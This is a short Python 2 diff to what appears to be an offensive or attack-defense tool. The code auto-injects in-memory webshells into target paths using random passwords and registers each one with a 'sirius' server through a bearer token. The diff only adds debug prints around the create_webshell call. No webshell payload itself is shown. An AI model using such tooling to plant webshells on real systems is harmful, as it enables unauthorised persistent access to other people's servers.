@@ -150,6 +150,7 @@ def create_webshell(target_url, path, filename, password, memory=False):
         int(config.get("sirius", "port")),
         "webshell",
     )
+    print url
 
     data = {
         "alive":True,
@@ -160,6 +161,7 @@ def create_webshell(target_url, path, filename, password, memory=False):
         "memory":memory,
     }
     print data
+    print "\n\n\n\nwwebshell created"
     # print data
     response = requests.post(url, headers={
         'Authorization': 'Bearer %s' % (config.get("sirius", "token")),
@@ -247,14 +249,14 @@ def main():
         password = random_string(0x10, string.letters + string.digits)
         shells = webshell.auto_inject_memery_webshell(filename, password)
         for shell in shells:
-            create_webshell(
-                shell["target_url"], 
-                shell["path"], 
-                filename, 
+            print shell
+            print create_webshell(
+                shell["target_url"],
+                shell["path"],
+                filename,
                 password,
                 memory=True,
             )
-
     # LOCAL_COMMAND_FLAG = True
     # main_help()
 
